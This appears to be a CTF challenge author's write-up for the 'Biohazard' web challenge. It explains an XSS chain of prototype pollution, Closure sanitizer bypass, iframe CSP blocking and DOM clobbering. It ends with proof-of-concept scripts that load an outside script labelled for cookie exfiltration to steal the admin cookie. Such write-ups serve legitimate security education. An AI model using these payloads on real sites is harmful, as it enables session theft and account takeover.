# Biohazard

## Objective

Find XSS in the Bio+ site, and use it to steal the admin cookie (i.e. flag).

## Purpose of the challenge

Given [Strict CSP](https://www.w3.org/TR/CSP3/#strict-csp) and [Trusted Types](https://www.w3.org/TR/trusted-types/) enforcement, I wanted to make a challenge which is still be vulnerable to XSS.
To mimic commonly used setup at Google, I've used [Closure Library](https://github.com/google/closure-library) and [safevalues](https://github.com/google/safevalues) which are both open sourced.
I've introduced a few vulnerabilities such as [Prototype Pollution](https://portswigger.net/web-security/prototype-pollution) and HTML injection. And I've also exposed several exploitation/bypass primitives such as [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering) (through HTML injection) and [use of template](https://github.com/shhnjk/shhnjk.github.io/blob/main/thoughts/digesting-the-concept-of-trusted-types.md#template-gadget).
The hope was to maximize the potential of unintended solutions, so that all of us can learn something out of this challenge.

## Intended solution

### Prototype Pollution

`Object.assign` is usually not vulnerable to Prototype Pollution, such as the following.

```
Object.assign({}, JSON.parse('{"__proto__":{"polluted": true}}'));
console.log(Object.prototype.polluted); // undefined
```

However, it is vulnerable when `Object.prototype` is passed in the first argument.

```
Object.assign(({})['__proto__'], JSON.parse('{"polluted": true}'));
console.log(Object.prototype.polluted); // true
```

And `main.js` has the same vulnerability.

```
interestObj = {"favorites":{}};
const uuid = viewPath[1];
const xhr = new XMLHttpRequest();
xhr.addEventListener("load", () => {
  if (xhr.status === 200) {
    const json = JSON.parse(xhr.response);
    for (const key of Object.keys(json)) {
      if (interestObj[key] === undefined) {
        interestObj[key] = json[key];
      } else{
        Object.assign(interestObj[key], json[key]);
      }
    }
  } else {
    alert(xhr.response);
    location.href = '/';
  }
});
xhr.open('GET', `/bio/${uuid}`, false);
xhr.send();
```

Therefore, if you send a JSON request which contains `__proto__` key to the `/create` endpoint, you can cause Prototype Pollution in the bio page.

```
fetch('/create', {
  method:'POST',
  headers: {
    "Content-Type": "application/json",
  },
  body: `{"name":"test","introduction":"","favorites":{"hobbies":"","sports":""}, "__proto__": {"polluted": true}}`
});
```

### Closure sanitizer bypass

To render user supplied HTML in bio introduction, the challenge uses [Closure sanitizer](https://google.github.io/closure-library/api/goog.html.sanitizer.HtmlSanitizer.html). And because [Closure sanitizer can be bypassed with Prototype Pollution](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has), now you can inject arbitrary attributes in the bio HTML.

However, this does not lead to XSS, as the bio page has Strict CSP and Trusted Types enforced.

### Reviving XSS Auditor primitive

Now that we have Prototype Pollution and HTML injection (with arbitrary attribute control) in hand, what should we do?

In `bootstrap.js`, the `editor` variable looks suspicious.

```
if (!location.pathname.startsWith('/view/')) {
  ...
  editor = (x=>x)`/static/editor.js`;
}
```

This `editor` variable is used in `main.js` to include additional script.

```
import {safeScriptEl} from 'safevalues/dom';

...
function loadEditorResources() {
  ...
  const script = document.createElement('script');
  safeScriptEl.setSrc(script, trustedResourceUrl(editor));
  document.body.appendChild(script);
}

window.addEventListener('DOMContentLoaded', () => {
  render();
  if (!location.pathname.startsWith('/view/')) {
    loadEditorResources();
  }
});
```

If we can overwrite the `editor` attribute, we can trigger an XSS!

If you take a look at the Closure sanitizer config, you will notice that `<iframe>` is specifically allowed.

```
var Const = goog.string.Const;
var unsafe = goog.html.sanitizer.unsafe;
var builder = new goog.html.sanitizer.HtmlSanitizer.Builder();
builder = unsafe.alsoAllowTags(
    Const.from('IFRAME is required for Youtube embed'), builder, ['IFRAME']);
sanitizer = unsafe.alsoAllowAttributes(
    Const.from('iframe#src is required for Youtube embed'), builder,
    [
      {
      tagName: 'iframe',
      attributeName: 'src',
      policy: (s) => s.startsWith('https://') ? s : '',
      }
    ]).build();
```

You can use the `csp` attribute in iframe to block certain resources inside iframe (using CSP), if the page inside iframe is same-origin as parent (similar to the [XSS Auditor](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection#:~:text=This%20code%20is,unsafe%20debug%20code.) primitive). Therefore, you can block `bootstrap.js` from loading.

```
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```

### Defining `editor`

Since the `editor` variable is undefined inside the iframe, we just need to define it. There are 2 ways of doing this.

1. Use HTML injection to define `editor` using DOM clobbering.
2. Use Prototype Pollution to define `editor`.

Note that since the `editor` script will be only loaded outside of `/view/` path, the iframe has to point to something else, such as `/views/view/`. This is possible because the challenge is an SPA and always configured to load the main page no matter what the URL is.

Here are the PoCs for creating XSS bio, by running script in the challenge page.

DOM clobbering:

```
// https://biohazard-web.2023.ctfcompetition.com
const challengeOrigin = window.origin;
const cookieExfilScript = 'https://attack.shhnjk.com/alert.js';

const firstResponse = await fetch('/create', {
  method:'POST',
  headers: {
    "Content-Type": "application/json",
  },
  body: `{"name":"test","introduction":"<a id=editor href=${cookieExfilScript}></a><a id=editor></a>","favorites":{"hobbies":"","sports":""}, "__proto__": {"* ID": true}}`
});
const firstBio = await firstResponse.json();

const secondResponse = await fetch('/create', {
  method:'POST',
  headers: {
    "Content-Type": "application/json",
  },
  body: `{"name":"test","introduction":"<iframe src=\\"${challengeOrigin}/views/view/${firstBio.id}\\" csp=\\"script-src ${cookieExfilScript} ${challengeOrigin}/static/closure-library/ ${challengeOrigin}/static/sanitizer.js ${challengeOrigin}/static/main.js 'unsafe-inline' 'unsafe-eval'\\"></iframe>","favorites":{"hobbies":"","sports":""}, "__proto__": {"* CSP": true}}`
});
const secondBio = await secondResponse.json();

location.href = `/view/${secondBio.id}`;
```

Prototype Pollution:

```
// https://biohazard-web.2023.ctfcompetition.com
const challengeOrigin = window.origin;
const cookieExfilScript = 'https://attack.shhnjk.com/alert.js';

const firstResponse = await fetch('/create', {
  method:'POST',
  headers: {
    "Content-Type": "application/json",
  },
  body: `{"name":"test","introduction":"","favorites":{"hobbies":"","sports":""}, "__proto__": {"editor": ["${cookieExfilScript}"]}}`
});
const firstBio = await firstResponse.json();

const secondResponse = await fetch('/create', {
  method:'POST',
  headers: {
    "Content-Type": "application/json",
  },
  body: `{"name":"test","introduction":"<iframe src=\\"${challengeOrigin}/views/view/${firstBio.id}\\" csp=\\"script-src ${cookieExfilScript} ${challengeOrigin}/static/closure-library/ ${challengeOrigin}/static/sanitizer.js ${challengeOrigin}/static/main.js 'unsafe-inline' 'unsafe-eval'\\"></iframe>","favorites":{"hobbies":"","sports":""}, "__proto__": {"* CSP": true}}`
});
const secondBio = await secondResponse.json();

location.href=`/view/${secondBio.id}`;
```

Hope you enjoyed it!
